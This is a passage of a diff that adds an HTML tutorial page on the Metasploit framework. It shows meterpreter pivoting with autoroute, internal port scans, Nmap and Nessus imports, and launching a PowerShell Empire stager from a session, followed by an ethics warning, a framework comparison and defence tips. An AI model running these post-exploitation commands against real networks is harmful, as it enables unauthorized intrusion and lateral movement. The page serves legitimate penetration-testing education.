+<span id="cb9-2"><a href="#cb9-2" aria-hidden="true" tabindex="-1"></a><span class="ex">meterpreter</span> <span class="op">&gt;</span> run autoroute <span class="at">-s</span> 10.0.0.0/24</span>
+<span id="cb9-3"><a href="#cb9-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb9-4"><a href="#cb9-4" aria-hidden="true" tabindex="-1"></a><span class="co"># Back in MSF console</span></span>
+<span id="cb9-5"><a href="#cb9-5" aria-hidden="true" tabindex="-1"></a><span class="ex">msf</span> <span class="op">&gt;</span> use auxiliary/scanner/tcp/port</span>
+<span id="cb9-6"><a href="#cb9-6" aria-hidden="true" tabindex="-1"></a><span class="ex">msf</span> <span class="op">&gt;</span> set RHOSTS 10.0.0.10</span>
+<span id="cb9-7"><a href="#cb9-7" aria-hidden="true" tabindex="-1"></a><span class="ex">msf</span> <span class="op">&gt;</span> set PORTS 22,80,443</span>
+<span id="cb9-8"><a href="#cb9-8" aria-hidden="true" tabindex="-1"></a><span class="ex">msf</span> <span class="op">&gt;</span> run</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+</section>
+</section>
+<section id="integration-with-other-tools" class="level2">
+<h2 class="anchored" data-anchor-id="integration-with-other-tools">Integration with Other Tools</h2>
+<p>Metasploit works well with many other security tools:</p>
+<section id="nmap-integration" class="level3">
+<h3 class="anchored" data-anchor-id="nmap-integration">Nmap Integration</h3>
+<div class="sourceCode" id="cb10"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Run Nmap scan and import results</span></span>
+<span id="cb10-2"><a href="#cb10-2" aria-hidden="true" tabindex="-1"></a><span class="ex">msf</span> <span class="op">&gt;</span> db_nmap <span class="at">-sV</span> <span class="at">-p</span> 1-10000 192.168.1.0/24</span>
+<span id="cb10-3"><a href="#cb10-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb10-4"><a href="#cb10-4" aria-hidden="true" tabindex="-1"></a><span class="co"># Use scan results</span></span>
+<span id="cb10-5"><a href="#cb10-5" aria-hidden="true" tabindex="-1"></a><span class="ex">msf</span> <span class="op">&gt;</span> services <span class="at">-p</span> 445</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+</section>
+<section id="nexposenessus-integration" class="level3">
+<h3 class="anchored" data-anchor-id="nexposenessus-integration">Nexpose/Nessus Integration</h3>
+<div class="sourceCode" id="cb11"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Import Nexpose scan</span></span>
+<span id="cb11-2"><a href="#cb11-2" aria-hidden="true" tabindex="-1"></a><span class="ex">msf</span> <span class="op">&gt;</span> nexpose_connect admin:password@127.0.0.1:3780</span>
+<span id="cb11-3"><a href="#cb11-3" aria-hidden="true" tabindex="-1"></a><span class="ex">msf</span> <span class="op">&gt;</span> nexpose_scan 192.168.1.0/24</span>
+<span id="cb11-4"><a href="#cb11-4" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb11-5"><a href="#cb11-5" aria-hidden="true" tabindex="-1"></a><span class="co"># Import Nessus scan</span></span>
+<span id="cb11-6"><a href="#cb11-6" aria-hidden="true" tabindex="-1"></a><span class="ex">msf</span> <span class="op">&gt;</span> db_import /path/to/nessus_scan.nessus</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+</section>
+<section id="powershell-empire-integration" class="level3">
+<h3 class="anchored" data-anchor-id="powershell-empire-integration">PowerShell Empire Integration</h3>
+<p>Metasploit can work alongside PowerShell Empire for advanced post-exploitation:</p>
+<div class="sourceCode" id="cb12"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Generate Empire stager using Metasploit</span></span>
+<span id="cb12-2"><a href="#cb12-2" aria-hidden="true" tabindex="-1"></a><span class="ex">msf</span> <span class="op">&gt;</span> use exploit/windows/local/powershell_empire_launcher</span>
+<span id="cb12-3"><a href="#cb12-3" aria-hidden="true" tabindex="-1"></a><span class="ex">msf</span> <span class="op">&gt;</span> set SESSION 1</span>
+<span id="cb12-4"><a href="#cb12-4" aria-hidden="true" tabindex="-1"></a><span class="ex">msf</span> <span class="op">&gt;</span> run</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+</section>
+</section>
+<section id="security-considerations-and-ethics" class="level2">
+<h2 class="anchored" data-anchor-id="security-considerations-and-ethics">Security Considerations and Ethics</h2>
+<div class="callout callout-style-default callout-warning callout-titled">
+<div class="callout-header d-flex align-content-center">
+<div class="callout-icon-container">
+<i class="callout-icon"></i>
+</div>
+<div class="callout-title-container flex-fill">
+Warning
+</div>
+</div>
+<div class="callout-body-container callout-body">
+<p>Metasploit is a powerful tool that should only be used legally and ethically:</p>
+<ol type="1">
+<li>Always obtain proper authorization before testing</li>
+<li>Document your actions carefully</li>
+<li>Avoid damaging systems or data</li>
+<li>Report vulnerabilities responsibly</li>
+<li>Follow all applicable laws and regulations</li>
+</ol>
+</div>
+</div>
+</section>
+<section id="comparison-with-other-exploitation-frameworks" class="level2">
+<h2 class="anchored" data-anchor-id="comparison-with-other-exploitation-frameworks">Comparison with Other Exploitation Frameworks</h2>
+<table class="caption-top table">
+<thead>
+<tr class="header">
+<th>Feature</th>
+<th>Metasploit</th>
+<th>Cobalt Strike</th>
+<th>Core Impact</th>
+<th>Canvas</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>Cost</td>
+<td>Free (Framework)</td>
+<td>Commercial</td>
+<td>Commercial</td>
+<td>Commercial</td>
+</tr>
+<tr class="even">
+<td>GUI</td>
+<td>Basic (Pro)</td>
+<td>Advanced</td>
+<td>Advanced</td>
+<td>Advanced</td>
+</tr>
+<tr class="odd">
+<td>Module Count</td>
+<td>2000+</td>
+<td>Moderate</td>
+<td>Moderate</td>
+<td>Moderate</td>
+</tr>
+<tr class="even">
+<td>Community Support</td>
+<td>Excellent</td>
+<td>Good</td>
+<td>Limited</td>
+<td>Limited</td>
+</tr>
+<tr class="odd">
+<td>Customizability</td>
+<td>High</td>
+<td>Moderate</td>
+<td>Moderate</td>
+<td>Moderate</td>
+</tr>
+<tr class="even">
+<td>Learning Curve</td>
+<td>Moderate</td>
+<td>Steep</td>
+<td>Steep</td>
+<td>Steep</td>
+</tr>
+</tbody>
+</table>
+</section>
+<section id="defense-against-metasploit" class="level2">
+<h2 class="anchored" data-anchor-id="defense-against-metasploit">Defense Against Metasploit</h2>
+<p>Understanding how to defend against Metasploit is crucial for security professionals:</p>
+<ol type="1">
+<li>Keep systems patched and updated</li>
+<li>Use advanced endpoint protection</li>
+<li>Implement network segmentation</li>
+<li>Deploy intrusion detection/prevention systems</li>
+<li>Monitor for suspicious activities</li>
+<li>Use application whitelisting</li>
+<li>Train security teams on attacker techniques</li>
+</ol>
+</section>
+<section id="conclusion" class="level2">
+<h2 class="anchored" data-anchor-id="conclusion">Conclusion</h2>
+<p>Metasploit continues to be an essential tool in the security professional’s arsenal. Its power, flexibility, and extensibility make it invaluable for vulnerability assessment, penetration testing, and security research. When used responsibly, it helps improve security posture and protect against real-world threats.</p>
+<p>Whether you’re a security professional, researcher, or student, mastering Metasploit provides a deeper understanding of exploitation techniques and system vulnerabilities, contributing to more robust security implementations.</p>
+</section>
+<section id="resources-for-further-learning" class="level2">
+<h2 class="anchored" data-anchor-id="resources-for-further-learning">Resources for Further Learning</h2>
+<ul>
+<li><a href="https://docs.metasploit.com/">Official Metasploit Documentation</a></li>
+<li><a href="https://www.offensive-security.com/metasploit-unleashed/">Offensive Security Metasploit Unleashed</a></li>
+<li><a href="https://blog.rapid7.com/tag/metasploit/">Rapid7 Blog</a></li>
+<li><a href="https://github.com/rapid7/metasploit-framework">Metasploit GitHub Repository</a></li>
+<li><a href="https://www.offensive-security.com/pwk-oscp/">Penetration Testing with Kali Linux (PWK)</a></li>
+</ul>
 
 
+</section>
 
 </main> <!-- /main -->
 <script id="quarto-html-after-body" type="application/javascript">
